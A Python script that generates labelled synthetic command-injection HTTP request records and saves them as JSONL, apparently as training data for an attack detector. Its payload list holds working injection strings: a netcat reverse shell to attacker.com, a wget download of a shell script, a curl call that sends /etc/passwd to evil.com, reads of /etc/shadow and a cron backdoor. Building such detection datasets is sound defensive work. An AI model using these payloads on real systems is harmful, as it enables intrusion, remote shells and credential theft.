"""Command Injection Attack Traffic Generator."""

import json
import uuid
import time
from datetime import datetime
from pathlib import Path


COMMAND_PAYLOADS = {
    "shell_metachar": [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(whoami)",
        "; cat /etc/shadow",
        "| nc -e /bin/sh attacker.com 4444",
        "; wget http://evil.com/shell.sh -O /tmp/shell.sh",
    ],
    "pipe": [
        "test | ping -c 5 127.0.0.1",
        "test | nslookup evil.com",
        "test | curl http://evil.com/steal?data=$(cat /etc/passwd)",
        "test; echo vulnerability",
    ],
    "redirection": [
        "> /etc/cron.d/backdoor",
        ">> /tmp/log",
        "2>&1",
        "/dev/null 2>&1; malicious_command",
    ],
    "environment": [
        "$HOME/.bashrc",
        "$PATH:/tmp/evil",
        "${IFS}cat${IFS}/etc/passwd",
    ],
}

TARGET_ENDPOINTS = ["/search", "/products", "/login"]


def generate_command_requests(num_requests: int = 100) -> list[dict]:
    """Generate command injection attack requests."""
    requests = []
    timestamp = time.time()
    techniques = list(COMMAND_PAYLOADS.keys())

    for i in range(num_requests):
        technique = techniques[i % len(techniques)]
        payload = COMMAND_PAYLOADS[technique][i % len(COMMAND_PAYLOADS[technique])]
        endpoint = TARGET_ENDPOINTS[i % len(TARGET_ENDPOINTS)]

        if endpoint == "/login":
            path = "/login"
            query_string = ""
            body_fields = ["username", "password"]
            body = f"username={payload}&password=test"
            method = "POST"
        else:
            path = endpoint
            query_string = f"q={payload}"
            body_fields = []
            body = ""
            method = "GET"

        requests.append({
            "request_id": f"REQ-CMD-{uuid.uuid4().hex[:8].upper()}",
            "timestamp": datetime.fromtimestamp(timestamp).isoformat(),
            "method": method,
            "path": path,
            "query_string": query_string,
            "query": {"q": payload} if query_string else {},
            "headers": {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "content-type": "application/x-www-form-urlencoded" if body else "",
            },
            "body_fields": body_fields,
            "body_size": len(body.encode()) if body else 0,
            "session_id": f"S-ATTACK-{uuid.uuid4().hex[:6].upper()}",
            "source_id": f"ATTACKER-{uuid.uuid4().hex[:4].upper()}",
            "content_type": "application/x-www-form-urlencoded" if body else "",
            "label": "ATTACK",
            "attack_type": "COMMAND_INJECTION",
            "technique": technique,
            "payload": payload,
        })

        timestamp += 0.1

    return requests


def save_dataset(requests: list[dict], filepath: str):
    """Save attack requests to JSONL."""
    Path(filepath).parent.mkdir(parents=True, exist_ok=True)
    with open(filepath, "w") as f:
        for req in requests:
            f.write(json.dumps(req) + "\n")
    print(f"Saved {len(requests)} command injection requests to {filepath}")


if __name__ == "__main__":
    requests = generate_command_requests(100)
    save_dataset(requests, "data/raw/attacks/command.jsonl")
